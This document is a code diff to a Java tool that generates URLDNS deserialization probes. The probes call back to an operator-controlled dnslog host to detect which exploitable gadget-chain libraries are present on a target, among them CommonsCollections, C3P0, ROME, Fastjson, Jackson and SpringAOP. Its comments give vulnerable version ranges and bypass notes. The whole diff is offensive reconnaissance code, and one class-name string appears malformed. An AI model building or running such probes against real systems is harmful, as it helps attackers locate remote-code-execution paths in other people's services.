@@ -15,21 +15,22 @@ public class en {
 	static List<Object> list = new LinkedList<Object>();
 	static String dnslog;
 	static String[] defaultclass = {
-				"CommonsCollections13567",
-  				"CommonsCollections24",
-  				"CommonsBeanutils2",
-  				"C3P0",
-  				"AspectJWeaver",
-  				"bsh",
-  				"Groovy",
-  				"Becl",
-  				"DefiningClassLoader",
-  				"Jdk7u21",
-  				"JRE8u20",
-  				"Fastjson1",
-  				"Fastjson2",
-  				"Jackson1",
-  				"winlinux"
+			"CommonsCollections13567",
+				"CommonsCollections24",
+				"CommonsBeanutils2",
+				"C3P0",
+				"AspectJWeaver",
+				"bsh",
+				"Groovy",
+				"Becl",
+				"DefiningClassLoader",
+				"Jdk7u21",
+				"JRE8u20",
+				"ROME",
+				"Fastjson",
+				"Jackson",
+				"SpringAOP",
+				"winlinux"
   				};
 	static String[] jndidefaultclass = {
 			"org.apache.naming.factory.BeanFactory",
@@ -133,7 +134,7 @@ public class en {
 	  		list.add(cb19x);
 			break;
 		case "C3P0":
-	    	//c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为7387108436934414104
+	    	//c3p0，serialVersionUID不同,0.9.2pre2-0.9.5pre8为7387108436934414104,0.9.5pre9-0.9.5.5为-2440162180985815128
 	    	HashMap c3p092x = getURLDNSgadget("http://c3p092x."+dnslog, "com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase");
 	    	HashMap c3p095x = getURLDNSgadget("http://c3p095x."+dnslog, "com.mchange.v2.c3p0.test.AlwaysFailDataSource");
 	  		list.add(c3p092x);
@@ -182,20 +183,28 @@ public class en {
 	  		HashMap JRE8u20 = getURLDNSgadget("http://JRE8u20."+dnslog, "javax.swing.plaf.metal.MetalFileChooserUI$DirectoryComboBoxModel$1");
 	  		list.add(JRE8u20);
 			break;
-		case "Fastjson1":
-			//fastjson<=1248存在一个链,全版本也存在一个链
-			HashMap fastjson1 = getURLDNSgadget("http://fastjson."+dnslog, "com.alibaba.fastjson.JSONArray");
-	  		list.add(fastjson1);
+		case "ROME":
+			//rome <= 1.11.1
+			HashMap rome1000 = getURLDNSgadget("http://rome1000."+dnslog, "com.sun.syndication.feed.impl.ToStringBean");
+			HashMap rome1111 = getURLDNSgadget("http://rome1111."+dnslog, "com.rometools.rome.feed.impl.ObjectBean");
+	  		list.add(rome1000);
+	  		list.add(rome1111);
 			break;
-		case "Fastjson2":
-			//fastjson<=1248存在一个链,全版本也存在一个链
-			HashMap fastjson2 = getURLDNSgadget("http://fastjson1249."+dnslog, "com.alibaba.fastjson.util.RyuDouble");
-	  		list.add(fastjson2);
+		case "Fastjson":
+			//fastjson<=1248存在一个链,全版本需要用hashMap绕过checkAutoType
+			//此链依赖BadAttributeValueExpException,在JDK1.7中无法使用.此时需要用springAOP绕过
+			HashMap fastjson = getURLDNSgadget("http://fastjson."+dnslog, "com.alibaba.fastjson.JSONArray");
+	  		list.add(fastjson);
 			break;
-		case "Jackson1":
+		case "Jackson":
 			//jackson-databind>=2.10.0存在一个链
-			HashMap jackson1 = getURLDNSgadget("http://jackson2100."+dnslog, "com.fasterxml.jackson.databind.node.NodeSerialization");
-	  		list.add(jackson1);
+			HashMap jackson = getURLDNSgadget("http://jackson2100."+dnslog, "com.fasterxml.jackson.databind.node.NodeSerialization");
+	  		list.add(jackson);
+			break;
+		case "SpringAOP":
+			//fastjon/jackson两个链的变种都需要springAOP
+			HashMap springAOP = getURLDNSgadget("http://SpringAOP."+dnslog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
+	  		list.add(springAOP);
 			break;
 		case "winlinux":
 	  		//windows/linux版本判断
